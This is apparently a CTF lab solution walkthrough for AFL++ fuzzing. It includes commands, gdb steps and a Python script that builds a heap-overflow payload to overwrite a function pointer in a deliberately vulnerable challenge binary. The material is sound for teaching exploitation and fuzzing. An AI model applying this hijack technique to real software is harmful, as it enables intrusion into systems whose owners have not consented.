# Step-by-Step Walkthrough — Software Fuzzing with AFL++

This is the **full solution walkthrough** with exact commands. Only use this if you've tried `hints.md` and are still stuck — working it out yourself is the whole point of the exercise!

---

## Medium Track

### Step 1 — Build the instrumented binary

```bash
cd challenge_files/medium/
bash build.sh
```

### Step 2 — Fuzz it

```bash
afl-fuzz -i seeds -o out -- ./vuln_medium @@
```

Let it run. Watch the "paths found" counter climb as AFL++ discovers each of the four nested `if` checks in the source — this happens because each correct byte in `g.magic[0..3]` unlocks a brand-new `puts(...)` call, which is new code coverage AFL++ actively rewards. This is normally found within minutes.

### Step 3 — Replay the crash

```bash
ls out/default/crashes/
./vuln_medium out/default/crashes/id:000000,*
```

Expected output:
```
[*] stage 1 unlocked
[*] stage 2 unlocked
[*] stage 3 unlocked
[*] stage 4 unlocked

[FLAG] ACSA2026{c0v3r4g3_gu1d3d_fuzz1ng_w0rks}

Aborted (core dumped)
```

**Root cause:** `g.magic[0]` (a byte the attacker fully controls, value `0x41` = 65) is used directly as an array index into `lut[4]` with no bounds check, corrupting memory far past the end of the array — a classic out-of-bounds write. The program raises `SIGABRT` after that write so the crash is deterministic; the flag is printed first.

---

## Hard Track (Expert)

### Step 1 — Build with ASan

```bash
cd challenge_files/hard/
bash build.sh
```

### Step 2 — Fuzz it with ASan enabled

```bash
AFL_USE_ASAN=1 afl-fuzz -i seeds -o out -- ./vuln_hard_asan @@
```

AFL++ should find a crash reasonably quickly — the bug (an unchecked length byte used as a `fread` size) is easy to trigger, it just doesn't do anything interesting on its own yet.

### Step 3 — Understand the crash

```bash
./vuln_hard_asan out/default/crashes/id:000000,*
```

You should see an **AddressSanitizer heap-buffer-overflow** report, showing a write past the end of a 16-byte allocation (`rec->name`). ASan's report will show the overflow landing inside (or past) the *next* heap allocation — that next allocation is `handlers[]`, the function pointer table.

**Root cause:** `vuln_hard.c` reads one length byte (0–255) from the file, then calls `fread(rec->name, 1, len, f)` directly into a 16-byte heap buffer with no check that `len <= 16`. A `len` greater than 16 overflows into the adjacent `handlers` allocation, which holds two function pointers that get called later.

### Step 4 — Find the target function's address

```bash
nm ./vuln_hard | grep -E ' win$| normal_handler$'
```

You'll see two addresses — `win()` (never called by any visible code path) and `normal_handler()` (the one normally invoked). The build keeps both symbols materialized and uses `-no-pie`, so the code address is stable for that build. Record the address from the binary you are actually running.

### Step 5 — Measure the exact heap gap

The overflow needs to travel from the start of `rec->name` to the start of `handlers[0]`. Confirm the exact distance for your build/libc rather than assuming a fixed number:

```bash
gdb ./vuln_hard
(gdb) list 50,90
(gdb) break vuln_hard.c:76
(gdb) run seeds/seed1
(gdb) print/x rec
(gdb) print/x handlers
(gdb) print/d (char *)handlers - (char *)rec
(gdb) print/x (void *)win
```

Break on the vulnerable `fread` line, after both `malloc()` calls have executed. Inspecting the pointers at the beginning of `main` produces uninitialized values. The pointer cast in `print/x (void *)win` makes GDB display the function address reliably. The printed difference is your `GAP` — the number of bytes from the start of `rec` to the start of `handlers` (which is also where `handlers[0]` lives, since it is the first element). One tested VM reported `GAP = 32` and `win() = 0x402450`; these values are examples, not constants.

### Step 6 — Craft the final input

```python
#!/usr/bin/env python3
import struct

GAP = 32          # replace with the value measured in GDB
WIN_ADDR = 0x402450  # replace with the address printed by GDB; VM-specific

payload_len = GAP + 8   # bytes needed to reach and overwrite handlers[0]
assert payload_len <= 255, "length byte can't hold this many bytes"

data = bytes([payload_len])                     # header: length byte
data += b"A" * GAP                              # filler up to handlers[0]
data += struct.pack("<Q", WIN_ADDR)             # overwrite handlers[0]

with open("exploit.bin", "wb") as f:
    f.write(data)
```

```bash
python3 craft_exploit.py
./vuln_hard exploit.bin
```

Expected output (the process exits normally after the controlled hijack):
```
[FLAG] ACSA2026{h34p_0v3rfl0w_pwn5_funct10n_p01nt3rs}
```

**Why fuzzing alone doesn't get you here:** AFL++ can easily find *a* crash (the length byte is trivial to overflow), but landing the exact 8-byte address of `win()` at the exact right offset by random mutation is astronomically unlikely. This step needs the same manual reverse-engineering and payload-crafting skills used in the other labs (private key extraction, shellcode) — fuzzing narrows the search, humans finish the job.

---

## Bonus Track — Fuzzing dlt-daemon (open-ended)

There's no fixed answer here — the goal is applying the same AFL++ workflow to a real, unfamiliar codebase:

```bash
git clone https://github.com/COVESA/dlt-daemon.git
cd dlt-daemon
# Check the project's own build docs for how to build with afl-clang-fast /
# a fuzzing harness — many real-world projects need a small custom harness
# (a main() that reads a file and calls into the library) rather than
# fuzzing the daemon binary directly.
```

Ask your instructor for a suggested entry point/function if you want a starting hint.
